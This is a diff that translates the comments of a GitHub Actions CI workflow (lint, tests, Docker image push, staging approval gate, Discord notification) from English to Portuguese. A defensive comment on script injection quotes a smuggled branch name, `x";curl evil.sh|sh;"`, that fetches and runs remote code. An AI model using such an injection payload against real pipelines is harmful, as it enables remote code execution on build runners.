@@ -1,15 +1,15 @@
-# ABOUTME: CI pipeline: quality gates that block the merge, then the Docker image build and push.
-# ABOUTME: Runs on every pull request targeting main and on every push that lands on main.
+# ABOUTME: Pipeline de CI: os portões de qualidade que bloqueiam o merge e, depois, o build e a publicação da imagem.
+# ABOUTME: Roda em todo pull request para a main e em todo push que chega na main.
 #
-# Reference: docs/ci-pipeline.md
+# Referência: docs/ci-pipeline.md
 
 name: CI
 
-# Three triggers, with different jobs to do:
-#   - pull_request: this is what makes the CI an actual merge GATE.
-#   - push on main: keeps the README badge honest about the health of main.
-#   - push of any tag: a tag is a release candidate, so it goes through the same
-#     gates and, once they pass, its image is published under the tag name.
+# Três gatilhos, cada um com um papel diferente:
+#   - pull_request: é isto que transforma o CI num PORTÃO de merge de verdade.
+#   - push na main: mantém o badge do README honesto sobre a saúde da main.
+#   - push de qualquer tag: uma tag é candidata a release, então passa pelos
+#     mesmos portões e, quando eles aprovam, a imagem sai com o nome da tag.
 on:
   pull_request:
     branches: [main]
@@ -17,20 +17,21 @@ on:
     branches: [main]
     tags: ['*']
 
-# Least privilege: the GITHUB_TOKEN of this workflow can only READ the repo.
-# Without this block the token defaults to contents: write. Jobs that need more
-# ask for it explicitly, one job at a time.
+# Menor privilégio: o GITHUB_TOKEN deste workflow só consegue LER o repositório.
+# Sem este bloco, o token viria com contents: write por padrão. O job que
+# precisar de mais pede explicitamente, um job de cada vez.
 permissions:
   contents: read
 
-# Only the latest run per branch matters. A new push cancels the previous run
-# instead of queueing behind it, which keeps the feedback on the PR fast.
+# Só a execução mais recente de cada branch interessa. Um push novo cancela a
+# execução anterior em vez de entrar na fila atrás dela, e o retorno no pull
+# request continua rápido.
 concurrency:
   group: ci-${{ github.ref }}
   cancel-in-progress: true
 
 env:
-  # Version used by the jobs that do not need the full matrix.
+  # Versão usada pelos jobs que não precisam da matrix inteira.
   DEFAULT_PYTHON_VERSION: '3.12'
 
 jobs:
@@ -59,22 +60,23 @@ jobs:
           python -m pip install --upgrade pip
           pip install -r requirements-dev.txt
 
-      # Configuration lives in pyproject.toml, so this exact command produces
-      # the exact same result on a developer machine and here.
+      # A configuração fica no pyproject.toml, então este mesmo comando produz
+      # exatamente o mesmo resultado na máquina de quem desenvolve e aqui.
       - name: Run ruff
         run: ruff check .
 
-  # The matrix lives here, in the caller. The test steps live in the reusable
-  # workflow. A job that calls a reusable workflow has no runs-on and no steps:
-  # whoever runs steps is the reusable one.
+  # A MATRIX fica aqui, no chamador. Os STEPS de teste ficam no workflow
+  # reutilizável. Um job que chama um reusable não tem runs-on nem steps: quem
+  # executa steps é o reusable. Esquecer disso é o erro mais comum.
   #
-  # security-events: write is granted here because the reusable workflow uploads
-  # the Trivy SARIF report to the Security tab.
-  # The tested versions come from the repository variable PYTHON_VERSIONS
-  # (Settings > Secrets and variables > Actions > Variables), so widening or
-  # narrowing the coverage does not require a commit. The literal after || is a
-  # fallback: without it, a clone of this repository with no variable set would
-  # break on fromJSON of an empty string.
+  # security-events: write é concedido aqui porque o reusable envia o relatório
+  # SARIF do Trivy para a aba Security.
+  #
+  # As versões testadas saem da variable PYTHON_VERSIONS do repositório
+  # (Settings > Secrets and variables > Actions > Variables), então ampliar ou
+  # reduzir a cobertura não exige commit. O literal depois do || é valor de
+  # reserva: sem ele, um clone deste repositório sem a variable cadastrada
+  # quebraria no fromJSON de uma string vazia.
   test:
     permissions:
       contents: read
@@ -87,36 +89,36 @@ jobs:
     with:
       python-version: ${{ matrix.python-version }}
 
-  # Builds the application image and publishes it to Docker Hub. needs: [lint,
-  # test] is the whole point: if any gate fails, this job is skipped, so an
-  # image that failed a scan or a test is never published.
+  # Constrói a imagem da aplicação e publica no Docker Hub. O needs: [lint,
+  # test] é o ponto central: se qualquer portão reprovar, este job é pulado —
+  # uma imagem que falhou num scan ou num teste nunca chega ao registry.
   #
-  # Tags follow docs/ci-pipeline.md:
-  #   pull request -> PR-<number>
-  #   push on main -> latest
-  #   push of tag  -> the tag itself
-  # plus the short commit hash on every build, which traces a running pod back
-  # to the exact commit it was built from.
+  # As tags seguem o docs/ci-pipeline.md:
+  #   pull request -> PR-<número>
+  #   push na main -> latest
+  #   push de tag  -> a própria tag
+  # mais o hash curto do commit em toda build, que permite rastrear um pod em
+  # execução até o commit exato de onde ele saiu.
   push:
     name: Build and push image
     needs: [lint, test]
     runs-on: ubuntu-latest
     env:
       IMAGE_NAME: app-k8s-todolist
-      # Read once at job level so the steps below can test it in if:, where the
-      # secrets context is not available.
+      # Lido uma vez no nível do job para que os steps abaixo possam testá-lo
+      # no if:, onde o contexto secrets não existe.
       DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
     steps:
       - name: Checkout
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
 
-      # Every value reaches the shell through env:, as in the notify job, so a
-      # branch or tag name cannot inject commands. On a pull_request event
-      # github.sha is the temporary merge commit, so the short hash is taken
-      # from the head of the branch instead.
+      # Todo valor chega ao shell por env:, como no job notify, para que um nome
+      # de branch ou de tag não consiga injetar comandos. Num evento
+      # pull_request o github.sha é o commit de merge temporário, então o hash
+      # curto vem do topo da branch em revisão.
       #
-      # Docker tags only accept letters, digits, dot, dash and underscore; any
-      # other character in a git tag name is replaced by a dash.
+      # Tag de Docker só aceita letra, dígito, ponto, traço e sublinhado:
+      # qualquer outro caractere do nome da tag do git vira traço.
       - name: Compute image tags
         id: tags
         env:
@@ -144,9 +146,10 @@ jobs:
           } >> "$GITHUB_OUTPUT"
           echo "Image tags: ${main_tag}, ${short_sha}"
 
-      # The same guard as in notify: without Docker Hub credentials, as in a
-      # pull request from a fork or a clone of this repository, the image is
-      # still built, which proves the Dockerfile works, but it is not pushed.
+      # A mesma proteção do notify: sem credencial do Docker Hub — num pull
+      # request vindo de um fork, ou num clone deste repositório — a imagem
+      # ainda é construída, o que prova que o Dockerfile funciona, mas não é
+      # publicada.
       - name: Log in to Docker Hub
         if: env.DOCKERHUB_USERNAME != ''
         uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f  # v4.6.0
@@ -154,16 +157,17 @@ jobs:
           username: ${{ env.DOCKERHUB_USERNAME }}
           password: ${{ secrets.DOCKERHUB_TOKEN }}
 
-      # Buildx is the builder behind build-push-action, and the one that can
-      # keep image layers in the GitHub Actions cache.
+      # O Buildx é o construtor por trás do build-push-action, e é ele que
+      # consegue guardar as camadas da imagem no cache do GitHub Actions.
       - name: Set up Docker Buildx
         uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e  # v4.3.0
 
-      # IMAGE_TAGS is the build-arg the Dockerfile turns into the app footer, so
-      # a running pod shows which build it came from.
+      # IMAGE_TAGS é o build-arg que o Dockerfile transforma no rodapé da
+      # aplicação: um pod em execução mostra de qual build ele veio.
       #
-      # type=gha keeps the image layers in the GitHub Actions cache: when only
-      # app.py changes, the dependency layer is reused instead of rebuilt.
+      # type=gha guarda as camadas no cache do GitHub Actions: quando só o
+      # app.py muda, a camada de dependências é reaproveitada em vez de
+      # reconstruída.
       - name: Build and push
         uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a  # v7.3.0
         with:
@@ -175,20 +179,20 @@ jobs:
           cache-from: type=gha
           cache-to: type=gha,mode=max
 
-  # Placeholder deployment whose real purpose is the human approval gate. The
-  # staging environment is configured with required reviewers, so this job shows
-  # up as "Waiting" and pauses until someone approves it under Review
-  # deployments. The approval is recorded in the repository deployment history,
-  # which is auditing for free.
+  # Deploy simulado, cujo propósito real é o portão de aprovação humana. O
+  # environment staging está configurado com required reviewers, então este job
+  # aparece como "Waiting" e fica parado até alguém aprovar em Review
+  # deployments. A aprovação fica registrada no histórico de deployments do
+  # repositório: auditoria de graça.
   #
-  # needs includes push, so staging only receives a commit whose image is
-  # already on Docker Hub.
+  # O needs inclui push, então staging só recebe um commit cuja imagem já está
+  # no Docker Hub.
   #
-  # The if: restricts it to a push on main: deploying on every pull request
-  # would make no sense, and reviewers would be asked to approve constantly.
+  # O if: restringe a um push na main: implantar a cada pull request não faria
+  # sentido, e os revisores seriam chamados para aprovar o tempo todo.
   #
-  # Do NOT mark this job as a required status check: it never runs on a pull
-  # request, so a required check that never reports would block every merge.
+  # NÃO marque este job como required status check: ele nunca roda em pull
+  # request, e um check obrigatório que nunca reporta trava todo merge.
   deploy-staging:
     name: Deploy to staging (dummy)
     needs: [lint, test, push]
@@ -202,24 +206,24 @@ jobs:
           echo "Deploying commit ${{ github.sha }} to staging"
           echo "Target: ${{ secrets.STAGING_URL }}"
 
-  # Notification job. if: always() is mandatory here: a job that depends on the
-  # success of the previous ones would never fire on failure, which is exactly
-  # when the team needs to hear about it.
+  # Job de notificação. O if: always() é obrigatório aqui: um job que dependa
+  # do sucesso dos anteriores nunca dispararia numa falha — que é exatamente
+  # quando o time precisa ser avisado.
   notify:
     name: Notify pipeline result
     needs: [lint, test, push, deploy-staging]
     if: always()
     runs-on: ubuntu-latest
     steps:
-      # How a step hands a value to a later step: it appends `name=value` lines
-      # to the file whose path the runner exposes as $GITHUB_OUTPUT. The `id:`
-      # below is what makes those values addressable as steps.msg.outputs.<name>
-      # from the next step on.
+      # Como um step entrega um valor para outro step: acrescentando linhas
+      # `nome=valor` ao arquivo cujo caminho o runner expõe em $GITHUB_OUTPUT. O
+      # `id:` abaixo é o que torna esses valores endereçáveis como
+      # steps.msg.outputs.<nome> do próximo step em diante.
       #
-      # deploy-staging is skipped on pull requests, and push is skipped whenever
-      # a gate fails, so "skipped" counts as neutral for both. Treating it as a
-      # failure would make every pull request report a red pipeline; a failing
-      # gate already turns the card red on its own.
+      # O deploy-staging fica skipped em pull request, e o push fica skipped
+      # sempre que um portão reprova: por isso "skipped" conta como neutro nos
+      # dois. Tratar como falha faria todo pull request reportar pipeline
+      # vermelho — e um portão reprovado já deixa o card vermelho sozinho.
       - name: Compose message
         id: msg
         env:
@@ -229,15 +233,15 @@ jobs:
           PUSH_RESULT: ${{ needs.push.result }}
           EVENT_NAME: ${{ github.event_name }}
           REF_TYPE: ${{ github.ref_type }}
-          # github.ref_name is `2/merge` on a pull request: the internal merge
-          # ref, not a branch anybody recognises. head_ref carries the real
-          # source branch and is empty outside a pull request, so the ||
-          # fallback covers push and tag.
+          # Em pull request, o github.ref_name é `2/merge`: a ref interna de
+          # merge, não uma branch que alguém reconheça. O head_ref carrega a
+          # branch de origem de verdade e fica vazio fora de pull request, então
+          # o || cobre push e tag.
           BRANCH: ${{ github.head_ref || github.ref_name }}
           PR_NUMBER: ${{ github.event.pull_request.number }}
           SUBJECT: ${{ github.event.pull_request.title || github.event.head_commit.message }}
         run: |
-          # One icon per job result: the card is readable before it is read.
+          # Um ícone por resultado de job: o card se entende antes de ser lido.
           icon() {
             case "$1" in
               success)   printf '✅' ;;
@@ -252,14 +256,14 @@ jobs:
              && [ "$TEST_RESULT" = "success" ] \
              && { [ "$PUSH_RESULT" = "success" ] || [ "$PUSH_RESULT" = "skipped" ]; } \
              && { [ "$DEPLOY_RESULT" = "success" ] || [ "$DEPLOY_RESULT" = "skipped" ]; }; then
-            # Discord wants the embed colour as a decimal integer:
-            # 3066993 is #2ECC71 (green), 15158332 is #E74C3C (red).
+            # O Discord quer a cor do embed como inteiro decimal:
+            # 3066993 é #2ECC71 (verde), 15158332 é #E74C3C (vermelho).
             status=SUCCESS; status_icon='✅'; color=3066993
           else
             status=FAILURE; status_icon='❌'; color=15158332
           fi
 
-          # What fired the run, named the way a human would say it.
+          # O que disparou a execução, dito como uma pessoa diria.
           case "$EVENT_NAME" in
             pull_request) trigger="Pull request #${PR_NUMBER}" ;;
             *) if [ "$REF_TYPE" = "tag" ]; then
@@ -278,23 +282,23 @@ jobs:
             echo "tests=$(icon "$TEST_RESULT") $TEST_RESULT"
             echo "image=$(icon "$PUSH_RESULT") $PUSH_RESULT"
             echo "deploy=$(icon "$DEPLOY_RESULT") $DEPLOY_RESULT"
-            # First line of a commit message only, trimmed to fit the embed.
+            # Só a primeira linha da mensagem do commit, cortada para caber no embed.
             echo "subject=$(printf '%s' "$SUBJECT" | head -n 1 | cut -c1-120)"
           } >> "$GITHUB_OUTPUT"
 
-      # Every value the payload needs arrives through env:, and the shell reads
-      # it as $VAR. Writing ${{ ... }} straight into a run: block would paste the
-      # value into the script text before the shell ever sees it, so a branch
-      # named `x";curl evil.sh|sh;"` would execute — the classic Actions script
-      # injection. Through env: the value is just data.
+      # Todo valor que o payload precisa chega por env:, e o shell lê como
+      # $VAR. Escrever ${{ ... }} direto num bloco run: colaria o valor no TEXTO
+      # do script antes de o shell existir: uma branch chamada
+      # `x";curl evil.sh|sh;"` seria executada — a injeção de script clássica do
+      # Actions. Passando por env:, o valor é apenas dado.
       #
-      # jq builds the JSON instead of string concatenation, so a quote or an
-      # accent in a branch name cannot produce a malformed body. jq comes
-      # preinstalled on the GitHub-hosted Ubuntu runners.
+      # O jq monta o JSON em vez de concatenar string, então uma aspa ou um
+      # acento num nome de branch não geram um corpo malformado. O jq já vem
+      # instalado nos runners Ubuntu hospedados pelo GitHub.
       #
-      # The guard sits on the step, not on the job, because the secrets context
-      # is not available in a job-level if:. Without it, a clone of this
-      # repository with no webhook configured would fail on an empty curl.
+      # A proteção fica no STEP, não no job, porque o contexto secrets não está
+      # disponível num if: de job. Sem ela, um clone deste repositório sem
+      # webhook cadastrado falharia num curl vazio.
       - name: Send Discord notification
         if: env.WEBHOOK_URL != ''
         env:
@@ -303,11 +307,11 @@ jobs:
           RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
           ACTOR_URL: ${{ github.server_url }}/${{ github.actor }}
           AVATAR_URL: ${{ github.server_url }}/${{ github.actor }}.png?size=64
-          # On a pull_request event github.sha is the throwaway merge commit the
-          # runner builds under refs/pull/N/merge: it belongs to no branch and a
-          # link to it lands on an orphan commit page. head.sha is the tip of the
-          # branch under review, which is the commit a reader expects. The ||
-          # falls back for push and tag, where head.sha does not exist.
+          # Em pull_request, o github.sha é o commit de merge descartável que o
+          # runner cria em refs/pull/N/merge: não pertence a branch nenhuma, e um
+          # link para ele cai numa página de commit órfão. O head.sha é o topo da
+          # branch em revisão, que é o commit que quem lê espera. O || cobre push
+          # e tag, onde head.sha não existe.
           SHA: ${{ github.event.pull_request.head.sha || github.sha }}
           REPO: ${{ github.repository }}
           ACTOR: ${{ github.actor }}
@@ -322,12 +326,12 @@ jobs:
           IMAGE: ${{ steps.msg.outputs.image }}
           DEPLOY: ${{ steps.msg.outputs.deploy }}
         run: |
-          # Headline of the card: what changed, which commit, what triggered it.
-          # The backticks below are Markdown for the Discord card, not command
-          # substitution, hence the ShellCheck SC2016 exception.
+          # Manchete do card: o que mudou, qual commit, o que disparou.
+          # As crases abaixo são Markdown do card do Discord, não substituição de
+          # comando — daí a exceção do ShellCheck SC2016.
           # shellcheck disable=SC2016
-          # The commit URL is built here so that SHA stays the single source of
-          # truth for both the link and the text next to it.
+          # A URL do commit é montada aqui para que SHA continue sendo a fonte
+          # única de verdade tanto do link quanto do texto ao lado dele.
           description=$(printf '**%s**\n[`%s`](%s/commit/%s) · %s' \
             "$SUBJECT" "${SHA:0:7}" "$REPO_URL" "$SHA" "$TRIGGER")
 
